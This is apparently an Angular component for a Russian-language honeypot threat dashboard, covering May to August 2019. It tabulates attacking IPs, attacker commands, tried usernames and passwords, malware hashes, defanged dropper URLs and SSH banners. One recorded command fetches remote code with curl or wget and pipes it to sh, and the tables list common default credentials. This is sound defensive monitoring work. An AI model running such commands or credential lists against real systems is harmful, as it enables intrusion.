import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import * as Highcharts from 'highcharts';


export interface PeriodicElement {
  source: string;
  count: number;
}

const ELEMENT_DATA: PeriodicElement[] = [
  {source: '5.188.86.167', count: 2979670},
  {source: '134.19.187.75', count: 2513437},
  {source: '185.220.221.208', count: 2239231},
  {source: '5.188.86.168', count: 2204691},
  {source: '5.188.86.165', count: 2190136},
  {source: '5.188.86.169', count: 2161893},
  {source: '5.188.86.164', count: 2138639},
  {source: '5.188.86.210', count: 1874200},
  {source: '5.188.87.51', count: 1805323},
  {source: '5.188.86.207', count: 1757104},
  
];

const ELEMENT_DATA2: PeriodicElement[] = [
  {source: 'shell', count: 66994},
  {source: 'sh', count: 33284},
  {source: 'system', count: 26374},
  {source: ' ', count: 23944},
  {source: 'uname -a', count: 21668},
  {source: '(curl -fsSL Isd.systemten.org||wget -q -O- Isd.systemten.org)|sh>/dev/null 2>&1 &', count: 13621},
  {source: '(curl -fsSL Isd.systemten.org', count: 13621},
  {source: 'enable', count: 13203},
  {source: 'while read i', count: 13043},
  {source: 'dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s', count: 13040},
  
];

const ELEMENT_DATA3: PeriodicElement[] = [
  {source: 'root', count: 8472967},
  {source: 'admin', count: 299098},
  {source: 'guest', count: 27438},
  {source: 'ftp', count: 26787},
  {source: 'default', count: 25936},
  {source: 'nagios', count: 20981},
  {source: 'ftpuser', count: 20632},
  {source: 'operator', count: 18253},
  {source: 'administrator', count: 16620},
  
];

const ELEMENT_DATA4: PeriodicElement[] = [
  {source: 'admin', count: 8373212},
  {source: '(blank)', count: 53293},
  {source: '123456', count: 43092},
  {source: 'root', count: 33678},
  {source: '12345', count: 26080},
  {source: '1234', count: 18244},
  {source: '123', count: 17502},
  {source: 'password', count: 15634},
  {source: '12345678', count: 14896},
  {source: '111111', count: 13311},
  
];

const ELEMENT_DATA5: PeriodicElement[] = [
  {source: '844290834b6450425b146d4517cdf780', count: 1},
  {source: '1c713057ad792bf898fc76194412d91a', count: 1},
  {source: 'd6362bdf13a789790e7cadcd110b9e4d', count: 1},
  {source: '2aa234ee6751b9b53721fe38db41a5e0', count: 1},
  {source: '460d954551187b65670074c8d5a7210c', count: 1},
  {source: '8831cfc4b15416f07eb34d944641e179', count: 1},
  {source: '685bc2af410d86a742b59b96d116a7d9', count: 1},

  
];

const ELEMENT_DATA6: PeriodicElement[] = [
  {source: 'hxxp://Isd.systemnet.org', count: 14527},
  {source: 'hxxp://23.254.230.38/p3n1s.sh', count: 1730},
  {source: 'hxxp://102.165.48.81/njs.sh', count: 958},
  {source: 'hxxp://46.246.45.139/bin.sh', count: 406},
  {source: 'hxxp://46.246.44.47/bin.sh', count: 107},
  {source: 'hxxp://46.246.43.10/bin.sh', count: 89},
  {source: 'hxxp://185.30.233.134/8UsA.sh', count: 86},
  {source: 'hxxp://91.209.70.174/Corona.sh', count: 68},
  {source: 'hxxp://sssooo', count: 51},
  {source: 'hxxp://46.246.44.146/bin.sh', count: 42},
  
];

const ELEMENT_DATA7: PeriodicElement[] = [
  {source: 'SSH-2.0-Go', count: 2979670},
  {source: 'SSH-2.0-libssh2_1.4.3', count: 2513437},
  {source: 'SSH-2.0-libssh-0.2', count: 2239231},
  {source: 'SSH-2.0-libssh-0.6.3', count: 2204691},
  {source: 'SSH-2.0-PUTTY', count: 2190136},
  {source: 'SSH-2.0-OpenSSH_7.3', count: 2161893},
  {source: 'SSH-2.0-libssh2_1.8.2', count: 2138639},
  {source: 'SSH-2.0-libssh2_1.8.1_DEV', count: 1874200},
  {source: 'SSH-2.0-libssh2_1.7.0', count: 1805323},
 
  
];

@Component({
  selector: 'app-feed1',
  templateUrl: './feed1.component.html',
  styleUrls: ['./feed1.component.scss']
})
export class Feed1Component implements OnInit {
  displayedColumns: string[] = ['source', 'count'];
  dataSource = ELEMENT_DATA;
  dataSource2 = ELEMENT_DATA2;
  dataSource3 = ELEMENT_DATA3;
  dataSource4 = ELEMENT_DATA4;
  dataSource5 = ELEMENT_DATA5;
  dataSource6 = ELEMENT_DATA6;
  dataSource7 = ELEMENT_DATA7;


  public options: any = {
    chart: {
     
      plotBackgroundColor: null,
      plotBorderWidth: null,
      plotShadow: false,
      type: 'pie'
  },
  tooltip: {
    formatter: function() {
      return '<b>' + 'Страна: ' + this.point.name +'</b>'
    }
},
  title: {
      text: 'Топ стран, подвергшихся атакам с мая 2019 по август 2019'
  },
 
  plotOptions: {
      pie: {
          allowPointSelect: true,
          cursor: 'pointer',
          dataLabels: {
              enabled: true,
              format: '<b>{point.name}</b>'
          }
      }
  },
  series: [{
      name: 'Brands',
      colorByPoint: true,
      data: [{
          name: 'Ирландия',
          y: 61.41,
          sliced: true,
          selected: true
      }, {
          name: 'Румыния',
          y: 11.84
      }, {
          name: 'Германия',
          y: 8.85
      }, {
          name: 'Чехия',
          y: 6.67
      }, {
          name: 'Нидерланды',
          y: 4.18
      }, {
          name: 'Россия',
          y: 1.64
      }, {
          name: 'Швеция',
          y: 1.6
      }, {
          name: 'Китай',
          y: 1.2
      }, {
          name: 'Франция',
          y: 1.61
      },
      {
        name: 'CША',
        y: 1.0
    }]
  }]

  }

  public options1: any = {
    chart: {
     
      plotBackgroundColor: null,
      plotBorderWidth: null,
      plotShadow: false,
      type: 'pie'
  },
  tooltip: {
    formatter: function() {
      return '<b>' + 'Порт: ' + this.point.name +'</b>'
    }
},
  title: {
      text: 'Топ 10 портов'
  },
 
  plotOptions: {
      pie: {
          allowPointSelect: true,
          cursor: 'pointer',
          dataLabels: {
              enabled: true,
              format: '<b>{point.name}</b>'
          }
      }
  },
  series: [{
      colorByPoint: true,
      data: [{
          name: '22',
          y: 59.41,
          sliced: true,
          selected: true
      }, {
          name: '23',
          y: 25.84
      }, {
          name: '25',
          y: 4.85
      }, {
          name: '3306',
          y:  4.85
      }, {
          name: '143',
          y:  4.85
      }, {
          name: '80',
          y: 1.64
      }, {
          name: '110',
          y: 1.6
      }, {
          name: '1080',
          y: 1.6
      }, {
          name: '443',
          y: 1.4
      },
      {
        name: '5432',
        y: 1.3
    }]
  }]

  }

  constructor(private router: Router) { }

  ngOnInit() {
      const htm = document.getElementById("h");
                htm.style.overflow = "auto";
    window.scrollTo(0, 0);
    Highcharts.chart('container', this.options);
    Highcharts.chart('container1', this.options1);
  }

  
  navToFeeds() {
    this.router.navigate(['feeds']);
  }


}
